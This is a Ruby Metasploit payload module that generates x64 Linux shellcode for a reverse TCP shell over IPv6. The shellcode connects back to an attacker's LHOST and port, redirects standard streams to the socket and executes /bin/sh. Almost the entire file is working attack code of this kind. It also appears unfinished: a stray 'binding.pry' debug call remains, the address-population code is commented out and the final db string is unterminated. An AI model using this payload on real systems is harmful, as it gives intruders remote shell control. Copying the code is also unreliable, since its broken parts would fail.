##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 105

  include Msf::Payload::Single
  include Msf::Payload::Linux
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux x64 Command Shell, Reverse TCP Inline (IPv6)',
      'Description'   => 'Connect back to attacker and spawn a command shell over IPv6',
      'Author'        => 'epi <epibar052[at]gmail.com>',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_X64,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShellUnix,
      ))
      register_options([
         OptInt.new('SCOPEID', [false, "IPv6 scope ID, for link-local addresses", 0])
      ])
  end

  def generate_stage
      # tcp port conversion
      port_order = ([1,0]) # byte ordering
      tcp_port = [datastore['LPORT'].to_i].pack('n*').unpack('H*').to_s.scan(/../) # converts user input into integer and unpacked into a string array
      tcp_port.pop     # removes the first useless / from  the array
      tcp_port.shift   # removes the last useless  / from  the array
      tcp_port = (port_order.map{|x| tcp_port[x]}).join('') # reorder the array and convert it to a string.

      # apply same alterations to SCOPEID that were done to LPORT
      scope_id = [datastore['SCOPEID'].to_i].pack('n*').unpack('H*').to_s.scan(/../)
      scope_id.pop
      scope_id.shift
      scope_id = (port_order.map{|x| scope_id[x]}).join('')

      # ipv6 address conversion
      # converts user's input into ipv6 hex representation
      qwords = IPAddr.new(datastore['LHOST'], Socket::AF_INET6).hton.scan(/......../).map {|i| i.unpack('V').first.to_s(16)}
      binding.pry

      payload = <<-EOS
        socket_call:
            ; int socket(int domain, int type, int protocol)

            push   0x29
            pop    rax                          ; socket syscall
            push   0xa
            pop    rdi                          ; AF_INET6
            push   0x1
            pop    rsi                          ; SOCK_STREAM
            xor    edx,edx                      ; auto-select protocol 
            syscall

            push   rax
            pop    rdi                          ; store socket fd 

        ;populate_sockaddr_in6:
            ; struct sockaddr_in6 {
            ;     sa_family_t     sin6_family;   /* AF_INET6 */
            ;     in_port_t       sin6_port;     /* port number */
            ;     uint32_t        sin6_flowinfo; /* IPv6 flow information */
            ;     struct in6_addr sin6_addr;     /* IPv6 address */
            ;     uint32_t        sin6_scope_id; /* Scope ID (new in 2.4) */
            ; };

            ; struct in6_addr {
            ;     unsigned char   s6_addr[16];   /* IPv6 address */
            ; };

            ; assumption: rax contains result of socket syscall, use it to
            ; zero out rdx via sign extension
            ;cdq
            ;push rdx
            ;push rdx
            ;push rdx
            ;push rdx                            ; 32 bytes of 0s
            ;mov [rsp], 0x#{tcp_port}000a        ; sin6_port/sin6_family
            ;mov [rsp + 0x8], 0x#{qwords[0]}
            ;mov [rsp + 0x10], 0x#{qwords[1]}
            ;mov [rsp + 0x14], 0x#{scope_id}

            ;push rsp
            jmp get_address                     ; jmp-call-pop
        populate_sockaddr_in6:
            pop rsi                             ; store pointer to struct

        connect_call:
            ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
            ; rdi -> already contains server socket fd
            ; rsi -> already contains pointer to sockaddr_in6 struct 
            push   0x2a
            pop    rax                          ; connect syscall 
            push   0x1c
            pop    rdx                          ; length of sockaddr_in6 (28)
            syscall

        dup2_calls:
            ; int dup2(int oldfd, int newfd);
            ; rdi -> already contains server socket fd
            push   0x3
            pop    rsi                          ; newfd 

        dup2_loop:
            ; 2 -> 1 -> 0 (3 iterations)
            push   0x21
            pop    rax                          ; dup2 syscall
            dec esi
            syscall
            loopnz   dup2_loop

        exec_call:
            ; int execve(const char *filename, char *const argv[], char *const envp[]);
            push 0x3b
            pop rax                             ; execve call
            cdq                                 ; zero-out rdx via sign-extension
            mov rbx, '/bin/sh'
            push rbx
            push rsp
            pop rdi                             ; address of /bin/sh
            syscall

        get_address:
            call populate_sockaddr_in6
            ; sin6_family(2), sin6_port(2), sin6_flowinfo(4), sockaddr_in6(16), sin6_scope_id(4)
            db "\x0a\x00
      EOS

      Metasm::Shellcode.assemble(Metasm::X86_64.new, payload).encode_string
  end
end
